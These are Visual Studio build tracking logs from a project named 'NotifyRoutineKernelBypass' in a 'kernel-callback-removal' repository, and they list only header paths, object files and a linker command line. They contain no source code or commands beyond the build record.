C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NB30.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCEP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNTERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCASYNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SHELLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINPERF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSOCK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\INADDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSCARD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSIP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCSAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPESBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINIOCTL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINSMCRD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSPOOL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PRSHT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLE2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDLIB.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MALLOC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SEARCH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDLIB.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\LIMITS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWNBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CGUID.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COML2API.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OAIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\URLMON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SERVPROV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MSXML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEAUTO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMMDLG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\STRALIGN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSVC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCX.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IMM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IME_CMODES.H
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMORY.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\YVALS_CORE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XKEYCHECK.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XSTRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_SANITIZER_ANNOTATE_CONTAINER.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_STRING_VIEW.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\IOSFWD
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\YVALS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CRTDBG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_NEW_DEBUG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_NEW.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CRTDEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\USE_ANSI.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDIO
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_STDIO_CONFIG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CWCHAR
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\WCHAR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCONIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WDIRECT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SHARE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WPROCESS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WTIME.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SYS\STAT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SYS\TYPES.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTR1COMMON
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XUTILITY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_ITER_CORE.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\UTILITY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INITIALIZER_LIST
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDDEF
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\TYPE_TRAITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDINT
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDINT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CLIMITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDLIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\MATH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MATH.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XMEMORY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\LIMITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CFLOAT
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\FLOAT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INTRIN0.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INTRIN0.INL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\NEW
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EXCEPTION
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\MALLOC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_EXCEPTION.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_TERMINATE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XATOMIC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CCTYPE
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ACLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ACCCTRL.H
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEUTIL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PSAPI.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\IOSTREAM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\ISTREAM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\OSTREAM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\IOS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XLOCNUM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CMATH
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\ITERATOR
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STREAMBUF
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XIOSBASE
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SHARE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\SYSTEM_ERROR
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_SYSTEM_ERROR_ABI.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CERRNO
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDEXCEPT
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XCALL_ONCE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XERRC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\ATOMIC
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTHREADS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_THREADS_CORE.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTIMEC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CTIME
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\TIME.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XLOCALE
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\MEMORY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\TYPEINFO
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_TYPEINFO.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XFACET
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XLOCINFO
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_XLOCINFO_TYPES.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CLOCALE
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\LOCALE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\TCHAR.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\MAP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\TUPLE
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTREE
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TLHELP32.H

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/CL.write.1.tlog`:

```tlog
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.CPP|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMORY.CPP|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINE.CPP|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\VC143.PDB
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.OBJ
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMORY.OBJ
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMHANDLER.OBJ
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINE.OBJ
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINE.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\VC143.PDB
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\VC143.PDB
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMORY.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\VC143.PDB
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\VC143.PDB

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/Cl.items.tlog`:

```tlog
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\notifyRoutine.cpp;C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\x64\Release\notifyRoutine.obj
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\MemHandler.cpp;C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\x64\Release\MemHandler.obj
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\memory.cpp;C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\x64\Release\memory.obj
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass.cpp;C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\x64\Release\NotifyRoutineKernelBypass.obj

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/NotifyRoutineKernelBypass.lastbuildstate`:

```lastbuildstate
PlatformToolSet=v143:VCToolArchitecture=Native64Bit:VCToolsVersion=14.42.34433:TargetPlatformVersion=10.0.26100.0:
Release|x64|C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\|

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/link.command.1.tlog`:

```tlog
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMHANDLER.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMORY.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINE.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.OBJ
/OUT:"C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.EXE" /NOLOGO KERNEL32.LIB USER32.LIB GDI32.LIB WINSPOOL.LIB COMDLG32.LIB ADVAPI32.LIB SHELL32.LIB OLE32.LIB OLEAUT32.LIB UUID.LIB ODBC32.LIB ODBCCP32.LIB /MANIFEST /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /manifest:embed /DEBUG /PDB:"C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.PDB" /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /LTCG:incremental /LTCGOUT:"X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.IOBJ" /TLBID:1 /DYNAMICBASE /NXCOMPAT /IMPLIB:"C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.LIB" /MACHINE:X64 X64\RELEASE\NOTIFYROUTINE.OBJ
X64\RELEASE\MEMHANDLER.OBJ
X64\RELEASE\MEMORY.OBJ
X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.OBJ

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/link.read.1.tlog`:

```tlog
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMHANDLER.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMORY.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINE.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.OBJ
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\KERNEL32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\USER32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\GDI32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\WINSPOOL.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\COMDLG32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\ADVAPI32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\SHELL32.LIB
